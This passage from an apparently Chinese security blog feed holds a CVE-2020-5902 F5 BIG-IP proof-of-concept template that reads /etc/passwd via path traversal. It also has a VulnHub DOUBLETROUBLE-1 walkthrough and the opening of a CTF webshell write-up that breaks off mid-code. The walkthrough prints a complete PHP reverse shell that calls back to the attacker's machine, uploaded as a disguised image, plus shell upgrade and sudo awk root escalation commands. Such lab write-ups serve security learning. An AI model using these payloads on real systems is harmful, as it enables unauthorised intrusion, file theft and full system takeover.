class="string">poc-yaml-f5-big-ip-rce-cve-2020-5902</span></span><br><span class="line"><span class="attr">manual:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">set:</span></span><br><span class="line">    <span class="attr">r1:</span> <span class="string">randomLowercase(8)</span></span><br><span class="line">    <span class="attr">r2:</span> <span class="string">randomLowercase(8)</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">    <span class="attr">r0:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">&quot;root:[x*]:0:0:&quot;</span><span class="string">.bmatches(response.body)</span></span><br><span class="line">    <span class="attr">r1:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</span></span><br><span class="line">            <span class="attr">headers:</span></span><br><span class="line">                <span class="attr">Conten-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line">            <span class="attr">body:</span> <span class="string">&quot;fileName=/tmp/<span class="template-variable">&#123;&#123;r1&#125;&#125;</span>.txt&amp;content=<span class="template-variable">&#123;&#123;r2&#125;&#125;</span>&quot;</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span></span><br><span class="line">    <span class="attr">r2:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">            <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/&#123;&#123;r1&#125;&#125;.txt</span></span><br><span class="line">            <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(bytes(string(r2)))</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">r1()</span> <span class="string">&amp;&amp;</span> <span class="string">r2()</span> <span class="string">||</span> <span class="string">r0()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">IMF5er</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://mp.weixin.qq.com/s/d4IZlZLzgTJVpbu4MJT_-A</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E5%88%A9%E7%94%A8hsqldb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E5%88%A9%E7%94%A8hsqldb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</span><br><span class="line">https://www.jianshu.com/p/6402dc56982a</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BIG-IP </tag>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VulnHub靶场】DOUBLETROUBLE-1</title>
      <link href="/posts/dfff04dd.html"/>
      <url>/posts/dfff04dd.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>靶机下载地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/doubletrouble-1,743/</span><br></pre></td></tr></table></figure><p>成功导入靶场镜像后，设置网络为桥接模式，与攻击机kali在同一网段中；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶场：192.168.136.131</span><br><span class="line">kali：192.168.136.128</span><br></pre></td></tr></table></figure><p>若靶场无法获取IP地址，也无法ping通，需要更改靶场的配置文件；</p><p>由于ova格式文件是从VitrualBox虚拟机里面导出来的，vitrualbox的网卡名字是<code>enpXXX</code>，而vmware的网卡名字一般是<code>ens</code>开头，因此直接在VMWare中打开virtualbox导出的虚拟机是不会自动获取IP，需要先将网卡改成<code>ensXX</code>，然后重启才能获取IP；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/PeterWuu/article/details/105640638</span><br></pre></td></tr></table></figure><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>由于事先不知道配置的靶机的IP地址，因此先进行网段内存活主机探测；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307133546664.png" alt="image-20230307133546664"></p><p>成功发现靶场主机的IP地址为<code>192.168.136.131</code>，对该IP地址进行端口探测；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -A 192.168.136.131</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307134544870.png" alt="image-20230307134544870"></p><p>发现靶机开放了<code>80</code>和<code>22</code>号端口，访问<code>80</code>端口，显示了登录页面；</p><p><img src="/DOUBLETROUBLE-1/image-20230307134653508.png" alt="image-20230307134653508"></p><p>在Web页面中显示了所用的平台为<code>qdPM 9.1</code>，去公开的漏洞平台搜索，查看是否有可利用的EXP；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/</span><br></pre></td></tr></table></figure><p>发现存在未授权访问其数据库配置文件的漏洞，访问<code>/core/config/databases.yml</code>，即可读取到其配置文件内容，发现了其数据库的用户名密码；但是该靶场没有对外开放其数据库连接端口，此处无法进行连接；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host: localhost</span><br><span class="line">dbname: qdpm</span><br><span class="line">username: otis</span><br><span class="line">password: &quot;&lt;?php echo urlencode(&#x27;rush&#x27;) ; ?&gt;&quot;</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307143130266.png" alt="image-20230307143130266"></p><p>对该网站进行目录扫描，发现多个目录，；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://192.168.136.131/ -e*</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307135227484.png" alt="image-20230307135227484"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.136.131/ /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307135858923.png" alt="image-20230307135858923"></p><p>访问<code>secret</code>目录，发现在该目录下存在一张图片，图片的文件名为靶场名字，且显示的内容里有上面泄露的数据库信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.131/secret/</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307143655295.png" alt="image-20230307143655295"></p><p><img src="/DOUBLETROUBLE-1/image-20230307151259507.png" alt="image-20230307151259507"></p><p>使用<code>steghide</code>工具查看图片隐藏信息，但是缺少密码，无法获取其隐藏的信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info doubletrouble.jpg</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307152126613.png" alt="image-20230307152126613"></p><p>使用<code>stegseek</code>工具对图片进行解密，成功获取到图片隐藏信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 项目地址</span><br><span class="line">https://github.com/RickdeJager/stegseek/releases</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek --crack doubletrouble.jpg /usr/share/wordlists/rockyou.txt output.txt</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307153258679.png" alt="image-20230307153258679"></p><p>使用获取到的用户名密码登录系统，在系统个人信息中存在上传图片位置；</p><p><img src="/DOUBLETROUBLE-1/image-20230307155854366.png" alt="image-20230307155854366"></p><p><img src="/DOUBLETROUBLE-1/image-20230307160840113.png" alt="image-20230307160840113"></p><p>将下面的内容保存为<code>shell.jpg</code>，其中的IP为攻击机kali的IP地址；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Shell生成网站</span><br><span class="line">https://www.revshells.com/</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.136.128&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">9001</span>;</span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将上面保存的文件进行上传，截获数据包，将文件名后缀更改为<code>php</code>，将<code>Content-Type</code>更改为<code>application/octet-stream</code>；</p><p><img src="/DOUBLETROUBLE-1/image-20230307162017423.png" alt="image-20230307162017423"></p><p>通过前期的目录扫描可知，存在<code>uploads</code>目录，可以看到上传的文件；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.131/uploads/users/</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307162611996.png" alt="image-20230307162611996"></p><p>在攻击机kali本地启动监听，然后访问上传的PHP文件，即可获得shell；</p><p><img src="/DOUBLETROUBLE-1/image-20230307162842133.png" alt="image-20230307162842133"></p><p>可以通过如下命令来升级所使用的shell；</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307163303231.png" alt="image-20230307163303231"></p><p>查看当前用户可以使用的特权命令，发现当前用户可使用的特权命令为<code>awk</code>，且不需要密码；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307163509492.png" alt="image-20230307163509492"></p><p>使用<code>awk</code>命令提权方式来进行提权；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307163806048.png" alt="image-20230307163806048"></p><p>在系统内查找flag文件，发现没有找到；</p><p><img src="/DOUBLETROUBLE-1/image-20230307164046470.png" alt="image-20230307164046470"></p><p>发现在Root目录下存在一个ova文件；</p><p><img src="/DOUBLETROUBLE-1/image-20230307164200004.png" alt="image-20230307164200004"></p><p>在靶机的Root目录下，使用python启动http服务；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8090</span><br></pre></td></tr></table></figure><p><img src="/DOUBLETROUBLE-1/image-20230307164535579.png" alt="image-20230307164535579"></p><p>访问该目录，下载ova文件；</p><p><img src="/DOUBLETROUBLE-1/image-20230307164500222.png" alt="image-20230307164500222"></p>]]></content>
      
      
      <categories>
          
          <category> VulnHub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> qdPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php</title>
      <link href="/posts/7ed34c14.html"/>
      <url>/posts/7ed34c14.html</url>
      
        <content type="html"><![CDATA[<p>启动靶场环境，显示了网页源代码；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在代码中，通过正则匹配，过滤了大小写字母、数字、以及<code>_$@</code>等字符；</p><p>需要构建一个不包含数字、字母以及特殊字符的webshell；</p><p>可以参考以下的两篇文章，介绍了无字母、数字的webshell；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</span><br><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list</span><br></pre></td></tr></table></figure><h3 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h3><p>首先看如何绕过字母和数字限制，过滤代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span 